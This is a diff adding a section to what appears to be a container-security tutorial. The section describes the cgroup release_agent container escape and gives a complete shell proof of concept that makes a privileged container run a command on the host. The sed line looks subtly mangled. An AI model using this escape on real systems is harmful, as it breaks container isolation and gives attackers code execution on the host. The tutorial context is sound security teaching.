@@ -188,3 +188,37 @@ cat /sys/fs/cgroup/memory/docker/[CONTAINER ID]/memory.usage_in_bytes
 This will display the current memory usage of the container in bytes.
 
 By using PID and Cgroup, we can ensure that the processes and resources within the container are properly isolated and managed.
+
+
+
+## Created Group release agent (container escape).
+MITRE: Privilege Escalation
+
+The PoC relied on another misconfiguration where the container has elevated privileges, either by the --privileged flag or the apparmor=unconfined flag. The escape can be triggered by an exploit using the Linux cgroups (control groups) mechanism and a ‘release_agent’ file.
+
+Linux control groups are intended to allow multiple Docker containers to run in isolation while limiting and monitoring their use of resources. However, the ‘release_agent’ file contains a command that is executed by the kernel with full privileges on the host once the last task in a cgroup terminates. The PoC abuses this functionality by creating a ‘release_agent’ file with a malicious command, and then killing off all the tasks in the cgroup.
+
+As the cgroup files are present both in the container and on the host, it is possible to modify them from either, which means an attacker can spawn a process inside the cgroup and gain code execution on the host.
+
+
+```
+# On the host
+docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
+
+# In the container
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*perdir=([^,]*).*/1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+
+sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
+
+
+```
+
+MITRE: Privilege Escalation
